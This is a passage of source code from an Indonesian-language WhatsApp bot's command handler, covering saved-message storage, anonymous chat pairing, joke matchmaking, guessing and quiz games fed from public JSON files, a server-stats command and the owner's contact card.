m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                liaacans.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                let msgs = JSON.parse(fs.readFileSync('./json/datamsg.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
case 'anonymous': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
		this.anonymous = this.anonymous ? this.anonymous : {}
		let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                liaacans.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await liaacans.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, liaacans.user.name, m)
            }
	    break
	    case 'keluar': {
	    if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await liaacans.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, liaacans.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await liaacans.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, liaacans.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await liaacans.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await liaacans.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, liaacans.user.name, m)
                }
                break
            }
            
case 'jadian': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'JADIAN' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m, {mentions: menst})
}
break
case 'jodohku': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'JODOHKU' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m, {mentions: ments})
}
break
case 'gbtku': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
			if (!text) throw `Example : ${prefix + command} hai|halo`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `Menu` }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            case 'bisakah': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let bisa = ['Bisa','Coba Saja','Pasti Bisa','Mungkin Saja','Tidak Bisa','Tidak Mungkin','Coba Ulangi','Ngimpi kah?','yakin bisa?']
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Pertanyaan : Bisakah ${text}*\nJawab : ${keh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m)
            }
            break
            case 'apakah': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            	if (!text) throw `Example : ${prefix + command} saya bisa menang?`
            	let apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Coba Tanyakan Ayam']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Pertanyaan : apakah ${text}*\nJawab : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m)
            }
            break
            case 'kapan': case 'kapankah': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Nanti','Tidak Akan Pernah']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*Pertanyaan : ${command} ${text}*\nJawab : ${koh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m)
            }
            break
case 'delttc': case 'delttt': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
liaacans.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
m.reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
m.reply('rusak')
}
}
break
case 'ttc': case 'ttt': case 'tictactoe': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
let TicTacToe = require("../message/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await liaacans.sendText(room.x, str, m, { mentions: parseMention(str) } )
await liaacans.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'couple': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                liaacans.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: fkontak })
                liaacans.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: fkontak })
            }
        break
case 'family100': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await liaacans.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
case 'tebak': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6. lontong`
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await liaacans.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: fkontak })
liaacans.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break
case 'kuismath': case 'math': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('../json/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
liaacans.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
}
break
case 'suitpvp': case 'suit': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await liaacans.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) liaacans.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case 'ping': case 'botstatus': case 'stats': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
m.reply(respon)
}
break
/*case 'owner': case 'creator': {
notebook = `Halo ${pushname} Jika Ingin Mau Kenalan Sama Ownerku
Silahkan Klik List Dibawah Ini Ya😇 `
const sections = [
    {
	title: `Owner/Creator`,
	rows: [
	    {title: `Ownerrr, Saatnya Untuk Menampilkan Ownerku Yang Paling Cantik/Ganteng`, rowId: `${prefix}iniaku`}
	]
    },
    {
	title: `Donasi By RahmXBot`,
	rows: [
	    {title: `Donasi, Jika Berdonasi Harap Hubungi Owner Kami Ya!`, rowId: `${prefix}donasi`}
	]
    },
    {
	title: `Sewa Bot`,
	rows: [
	    {title: `Sewa Bot, Jika Mau Sewa Bot Harap Hubungi Owner Kami Ya!`, rowId: `${prefix}sewabot`}
	]
    },
    /*
    {
	title: `Teks Title`,
	rows: [
	    {title: `Teks Description`, rowId: `${prefix}commandmu`}
	]
    },*/ // Tambahin Aja Kalau Mw😙*/
    /*]
const listMessage = {
  text: notebook,
  footer: "© Created By RahmXBot\nWeb : https://cloudpedia.site",
  buttonText: "Click Disini",
  sections
}
const tessgh = await liaacans.sendMessage(m.chat, listMessage, { quoted: fkontak })
}
break*/
case 'iniaku': case 'iniaku2': case 'pemilik': {
let vcard = `BEGIN:VCARD\n` // metadata of the contact card
+ `VERSION:3.0\n`
+ `N:;${name}.;;;`
+ `FN:${name}.\n` // full name
+ `ORG:${name};\n` // the organization of the contact
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n` // WhatsApp ID + phone number
+ `END:VCARD`
let msg = await liaacans.sendMessage(m.chat, { contacts: { displayName: `${owner}`, contacts: [{ vcard }] } }, { quoted: fkontak })
await liaacans.sendMessage(m.chat, { text: `JANGAN SPAM NOMOR OWNERKU!!` })
}
break
